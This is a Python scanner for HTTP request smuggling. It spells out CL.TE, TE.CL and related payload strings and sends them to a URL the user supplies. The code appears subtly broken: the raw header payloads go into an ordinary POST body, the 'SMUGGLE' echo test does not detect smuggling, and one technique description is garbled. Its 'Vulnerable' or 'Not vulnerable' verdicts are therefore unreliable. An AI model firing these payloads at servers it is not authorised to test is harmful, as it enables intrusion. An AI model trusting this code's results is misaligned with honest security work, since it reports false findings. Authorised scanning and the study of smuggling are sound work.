#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: cbk914

import requests
from urllib3.exceptions import NewConnectionError, MaxRetryError
import argparse
import logging
import ssl

# Default per-request wall-clock budget in seconds.
DEFAULT_TIMEOUT = 10

# Define common payloads
PAYLOAD_CLTE = "0\r\nSMUGGLE\r\n"
PAYLOAD_CL0 = "GET / HTTP/1.1\r\nContent-Length:0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
PAYLOAD_SLRE = "POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ: X\r\n\r\n"
PAYLOAD_TECL = "GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\n0\r\n\r\n"
PAYLOAD_TESI = "GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n5\r\nhello\r\n0\r\n\r\n"

# Define techniques to check
TECHNIQUES = {
    "CLTE": ("Content-Length and Transfer-Encoding", "Content-Length: 7\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n" + PAYLOAD_CLTE),
    "CL0": ("Content-Length 0 (CL0)", PAYLOAD_CL0),
    "SLRE": ("Space before chunked-length and after chunked-data", PAYLOAD_SLRE + PAYLOAD_CLTE),
    "TECL": ("Transfer-Encoding and Content-Length", PAYLOAD_TECL),
    "TESI": ("Transfer-Encoding with a body ending in and chunked with no trailers", PAYLOAD_TESI),
}

def check_vulnerability(url, technique, verify=True, timeout=DEFAULT_TIMEOUT):
    """
    Check if a given URL is vulnerable to a particular request smuggling technique.

    Args:
        url (str): The URL to check for vulnerability.
        technique (str): The request smuggling technique to use for the check.
        verify (bool): Verify the server TLS certificate. Defaults to True;
            pass False only for a deliberately self-signed lab target.
        timeout (float): Per-request timeout in seconds.

    Returns:
        bool | None: True if the URL is vulnerable, False if the target gave a
        clean answer, and None when the check was *inconclusive* (TLS failure,
        timeout, connection error). None is deliberately distinct from False:
        a transport failure must never be reported as "Not vulnerable",
        otherwise an interception attempt silently produces a clean verdict.
    """
    technique_name, payload = TECHNIQUES[technique]
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    try:
        response = requests.post(url, headers=headers, data=payload, verify=verify, timeout=timeout)
    except requests.exceptions.SSLError as e:
        # Certificate verification failed. This is not a verdict about the
        # target: report inconclusive and let the operator decide.
        logging.error("TLS verification failed for %s: %s", url, e)
        if verify:
            print(f"Inconclusive for {technique_name}: TLS verification failed.")
            print("Use --insecure only for a target whose certificate you expect to be invalid.")
            return None
        print(f"Inconclusive for {technique_name}: TLS error.")
        return None
    except (NewConnectionError, MaxRetryError):
        logging.error("Connection error: Could not connect to the server.")
        return None
    except requests.exceptions.Timeout:
        logging.error("Connection error: Request timed out.")
        return None
    except requests.exceptions.TooManyRedirects:
        logging.error("Connection error: Too many redirects.")
        return None
    except requests.exceptions.RequestException as e:
        logging.error(f"Request error: {str(e)}")
        return None

    if "SMUGGLE" in response.text or (response.status_code == 400 and "Transfer-Encoding" in response.headers.get("Connection", "")):
        print(f"Vulnerable to {technique_name}!")
        return True

    print(f"Not vulnerable to {technique_name}.")
    return False

def check_all_vulnerabilities(url, verify=True, timeout=DEFAULT_TIMEOUT):
    """
    Check if a given URL is vulnerable to all known request smuggling techniques.

    Args:
        url (str): The URL to check for vulnerability.
        verify (bool): Verify the server TLS certificate.
        timeout (float): Per-request timeout in seconds.

    Returns:
        bool | None: True if any technique succeeded, False if all techniques
        gave a clean answer, None if every technique was inconclusive.
    """
    vulnerable = False
    saw_clean = False
    for technique in TECHNIQUES:
        result = check_vulnerability(url, technique, verify=verify, timeout=timeout)
        if result:
            vulnerable = True
        elif result is False:
            saw_clean = True
    if vulnerable:
        return True
    return False if saw_clean else None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Check a URL for request smuggling vulnerabilities")
    parser.add_argument("-u", "--url", help="URL to check", required=True)
    parser.add_argument("-t", "--technique", help="Technique to check", choices=TECHNIQUES.keys(), default=None)
    parser.add_argument("-d", "--debug", help="Enable debug mode", action="store_true")
    parser.add_argument("-k", "--insecure", dest="insecure", action="store_true",
                        help="Disable TLS certificate verification (lab targets only)")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT,
                        help=f"Per-request timeout in seconds (default: {DEFAULT_TIMEOUT})")
    args = parser.parse_args()

    # Configure logging level
    logging.basicConfig(level=logging.DEBUG if args.debug else logging.INFO)

    # Certificate verification is on unless explicitly disabled. Note that
    # urllib3's InsecureRequestWarning is intentionally NOT suppressed, so an
    # operator running with --insecure still sees that trust was dropped.
    verify = not args.insecure

    if args.technique:
        check_vulnerability(args.url, args.technique, verify=verify, timeout=args.timeout)
    else:
        check_all_vulnerabilities(args.url, verify=verify, timeout=args.timeout)
